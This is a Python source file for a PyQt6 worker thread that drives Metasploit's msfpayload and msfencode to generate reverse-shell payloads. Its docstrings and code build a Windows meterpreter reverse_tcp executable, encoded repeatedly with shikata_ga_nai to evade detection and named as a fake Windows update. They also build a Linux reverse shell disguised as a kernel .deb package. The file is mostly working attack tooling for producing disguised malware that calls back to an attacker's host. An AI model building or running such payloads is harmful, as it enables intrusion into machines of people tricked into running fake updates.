import subprocess
import subprocess
from PyQt6 import QtCore


class metasploit(QtCore.QThread):
    payloads_created_successfully = QtCore.pyqtSignal()
    windows_payload_error = QtCore.pyqtSignal()
    linux_payload_error = QtCore.pyqtSignal()
    
    def __init__(self, parent=None):
        super().__init__(parent)
        self.variables = {}
        self.run_status = 0

    def create_windows_payload(self,template,output_file):      # Windows Payload Creation function
        '''msfpayload windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4564 R |
           msfencode -x /tmp/template.exe -t exe -e x86/shikata_ga_nai -c 10 -o /
           tmp/Windows-KB183905-ENU.exe
        '''
        windows_payload_string = 'msfpayload %s LHOST=%s LPORT=%s R | msfencode -x %s -t exe -e %s -c %s -o %s'
        creation_status = subprocess.getstatusoutput(windows_payload_string % (self.variables['windows_payload'],
        self.variables['ip_address'],self.variables['port_setting'],template,self.variables['encoder_type'],
        self.variables['encode_number'],output_file))

        if creation_status[0] != 0:
            self.variables['windows payload error'] = creation_status[1]
            self.windows_payload_error.emit()
        else:
            self.run_status += 1



    def create_linux_payload(self,output_file):                 # Linux payload Creation function
        '''msfpayload linux/x86/shell/reverse_tcp LHOST=127.0.0.1
            LPORT=4566 X > /tmp/kernel_1.29_all_i386.deb
        '''
        linux_payload_string = 'msfpayload %s LHOST=%s LPORT=%s X > %s'
        creation_status = subprocess.getstatusoutput(linux_payload_string % (self.variables['linux_payload'],
        self.variables['ip_address'],str(int(self.variables['port_setting']) + 1),output_file))

        if creation_status[0] != 0:
            self.variables['linux payload error'] = creation_status[1]
            self.linux_payload_error.emit()
        else:
            self.run_status += 1


    def run(self):
        '''Start the Thread'''
        self.run_status = 0

        self.create_linux_payload(self.variables['output_path_linux'])
        self.create_windows_payload(self.variables['template'],self.variables['output_path_windows'])

        if self.run_status == 2:
            self.payloads_created_successfully.emit()


